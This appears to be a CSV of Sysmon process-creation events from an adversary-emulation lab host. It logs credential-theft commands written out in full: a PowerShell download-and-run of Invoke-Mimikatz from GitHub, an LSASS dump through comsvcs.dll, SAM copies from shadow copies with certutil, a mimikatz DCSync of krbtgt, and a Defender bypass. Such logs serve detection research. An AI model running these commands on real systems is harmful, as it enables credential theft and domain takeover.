computer_name,event_id,Image,OriginalFileName,CommandLine,CurrentDirectory,User,ParentImage,ParentCommandLine
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\rundll32.exe,RUNDLL32.EXE,"""C:\Windows\system32\rundll32.exe"" keymgr,KRShowKeyMgr",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {rundll32.exe keymgr,KRShowKeyMgr}"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null}",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\rundll32.exe,RUNDLL32.EXE,"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 788 C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\lsass-comsvcs.dmp full",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\johnny.douche\AppData\Local\Temp\twqwhtpq\twqwhtpq.cmdline""",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {Write-Host \""""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\"""" -fore green"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,CVTRES.EXE,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\RES7758.tmp"" ""c:\Users\johnny.douche\AppData\Local\Temp\twqwhtpq\CSCFA3F5ECEB087493481A8B8F8274A7C50.TMP""",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\johnny.douche\AppData\Local\Temp\twqwhtpq\twqwhtpq.cmdline"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,CVTRES.EXE,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\RES79E8.tmp"" ""c:\Users\johnny.douche\AppData\Local\Temp\gbwdkl4h\CSC7185516EBB35480DB17FD859B35BCA74.TMP""",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\johnny.douche\AppData\Local\Temp\gbwdkl4h\gbwdkl4h.cmdline"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\johnny.douche\AppData\Local\Temp\f3rpbb04\f3rpbb04.cmdline""",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {Write-Host \""""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\"""" -fore green"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,CVTRES.EXE,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\RES7861.tmp"" ""c:\Users\johnny.douche\AppData\Local\Temp\f3rpbb04\CSC960442087BED459FAFF3E80B7B25221.TMP""",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\johnny.douche\AppData\Local\Temp\f3rpbb04\f3rpbb04.cmdline"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\johnny.douche\AppData\Local\Temp\gbwdkl4h\gbwdkl4h.cmdline""",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {Write-Host \""""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\"""" -fore green"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""cmd.exe"" /c for /L %%a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%%a\Windows\System32\config\SAM"" %%temp%%\SAMvss%%a 2 >nul 2>&1) & dir /B %%temp%%\SAMvss*",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss1 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss4 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss5 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss6 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss9 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss10 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss8 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {1..10 | %% { ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss2 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss7 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\certutil.exe,CertUtil.exe,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM"" C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\SAMvss3 2 ",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""cmd.exe"" /c cmdkey /list",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmdkey.exe,cmdkey.exe,cmdkey  /list,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c cmdkey /list"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""cmd.exe"" /c %%tmp%%\mimikatz\x64\mimikatz.exe ""lsadump::dcsync /domain:%%userdnsdomain%% /user:krbtgt@%%userdnsdomain%%"" ""exit""",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\mimikatz\x64\mimikatz.exe,mimikatz.exe,"C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\mimikatz\x64\mimikatz.exe  ""lsadump::dcsync /domain:MY-CALDERA.LOCAL /user:krbtgt@MY-CALDERA.LOCAL"" ""exit""",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c %tmp%\mimikatz\x64\mimikatz.exe ""lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%"" ""exit"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(\""""\\"""")}",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""cmd.exe"" /c tasklist.exe & sc query & sc query state= all",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\tasklist.exe,tasklist.exe,tasklist.exe  ,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c tasklist.exe & sc query & sc query state= all"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\sc.exe,sc.exe,sc  query ,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c tasklist.exe & sc query & sc query state= all"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\sc.exe,sc.exe,sc  query state= all,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c tasklist.exe & sc query & sc query state= all"
MY-CAL-WIN10.my-caldera.local,1,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --field-trial-handle=4696,i,4286615809601135217,6239687195785596479,262144 --variations-seed-version --mojo-platform-channel-handle=2896 /prefetch:8",C:\Program Files (x86)\Microsoft\Edge\Application\125.0.2535.51\,MY-CAL-WIN10\Johnny Douche,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --flag-switches-begin --flag-switches-end --no-startup-window"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Windows\TEMP\yntur3eu\yntur3eu.cmdline""",C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'ed55e196c3ba20e739d7a8b74b76bb87befad0140137cdea9d633bca9e7b8d2e')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,CVTRES.EXE,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Windows\TEMP\RES6450.tmp"" ""c:\Windows\Temp\yntur3eu\CSCB3A1684733E946DEA6909A399757411C.TMP""",C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Windows\TEMP\yntur3eu\yntur3eu.cmdline"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,CVTRES.EXE,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Windows\TEMP\RES6D77.tmp"" ""c:\Windows\Temp\54ftu5ph\CSCA8D7D2642CDF42EBBF68F86464BDF656.TMP""",C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Windows\TEMP\54ftu5ph\54ftu5ph.cmdline"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net.exe,net.exe,"""C:\windows\system32\net.exe"" accounts",C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'ed55e196c3ba20e739d7a8b74b76bb87befad0140137cdea9d633bca9e7b8d2e')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net1.exe,net1.exe,C:\Windows\system32\net1 accounts,C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\System32\net.exe,"""C:\windows\system32\net.exe"" accounts"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net.exe,net.exe,"""C:\windows\system32\net.exe"" accounts",C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'ed55e196c3ba20e739d7a8b74b76bb87befad0140137cdea9d633bca9e7b8d2e')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8764.11253011.0.11253011.11253011-0aa2a9a1d9f4cbae1b8d23d120f639e384c1eb88\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net1.exe,net1.exe,C:\Windows\system32\net1 accounts,C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Downloads\,NT AUTHORITY\SYSTEM,C:\Windows\System32\net.exe,"""C:\windows\system32\net.exe"" accounts"
